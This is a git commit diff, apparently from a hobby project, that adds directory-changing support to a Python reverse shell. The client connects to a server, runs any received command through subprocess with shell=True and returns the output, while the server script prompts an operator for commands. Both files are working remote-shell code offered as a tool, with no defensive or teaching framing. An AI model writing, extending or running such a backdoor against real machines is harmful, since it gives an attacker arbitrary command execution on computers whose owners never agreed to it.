3e64cec4bef897d15d75825e958ef15b2bc2f351
leontech <martinleontech23@gmail.com>
2022-10-07 15:04:43 +0300

    --change-directory

--- client.py
+++ client.py
@@ -1,20 +1,28 @@
 import subprocess
 import socket
+import os
 ip_address="127.0.0.1"
 port=8080
-client=socket.socket()
+client=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 print("initiating process")
 client.connect((ip_address,port))
 print("connection intitated")
 while True:
     print("[-] wainting for commands")
+    client.send("{}$".format(os.getcwd()).encode())
     command=client.recv(1024)
     command= command.decode()
-    op=subprocess.Popen(command,shell=True,stderr=subprocess.PIPE,stdout=subprocess.PIPE)
-    output_error=op.stderr.read()
-    output=op.stdout.read()
-    print("sending response")
-    client.send(output+output_error)
+    # check commands
+    # change directory
+    if command.split()[0]=="cd":
+        os.chdir(command.split()[1])
+        client.send("Changed directory to {}".format(os.getcwd()).encode())
+    else:
+        op=subprocess.Popen(command,shell=True,stderr=subprocess.PIPE,stdout=subprocess.PIPE)
+        output_error=op.stderr.read()
+        output=op.stdout.read()
+        print("sending response")
+        client.send(output+output_error)
     
     
     
--- server.py
+++ server.py
@@ -1,9 +1,6 @@
 from assets.leonResources import color,custom_output,user_input,banner
-import subprocess
 import socket
-
-from click import command
-
+banner.leonBanner()
 ip_address='127.0.0.1'
 port=8080
 server=socket.socket()
@@ -15,10 +12,12 @@ client,client_add=server.accept()
 custom_output.info(f'[+]{client_add} connected succefully',color.cyan)
 
 while True:
-    command=user_input.useruput('Enter Command: ')
+    output=client.recv(1024)
+    output=output.decode()
+    command=user_input.useruput(f'{output}: ')
     command=command.encode()
     client.send(command)
     custom_output.info("[+] command sent",color.green)
     output=client.recv(1024)
     output=output.decode()
-    custom_output.info(f"Output>:\n{output}",color.blue)
+    custom_output.info(f"Output>:\n {output}",color.blue)
